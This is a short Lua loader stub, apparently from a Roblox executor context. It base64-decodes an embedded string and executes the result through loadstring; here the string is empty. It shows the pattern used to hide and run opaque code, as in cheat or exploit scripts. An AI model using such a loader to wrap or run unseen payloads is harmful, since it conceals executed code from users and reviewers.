local _=""
local r
local k=crypt
local d=k and (k.base64decode or (type(k.base64)=="table" and k.base64.decode))
if type(d)=="function" then local ok,v=pcall(d,_) if ok and type(v)=="string" then r=v end end
if not r then
local m={} local a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
for i=1,64 do m[a:sub(i,i)]=i-1 end
local c=string.char
r=(_:gsub("(.)(.)(.)(.)",function(a,b,x,y)
local u,v=m[a],m[b] local w,z=m[x] or 0,m[y] or 0
local p=u*4+math.floor(v/16)
if x=="=" then return c(p) end
local q=(v%16)*16+math.floor(w/4)
if y=="=" then return c(p,q) end
return c(p,q,(w%4)*64+z)
end))
end
return assert(loadstring(r))()
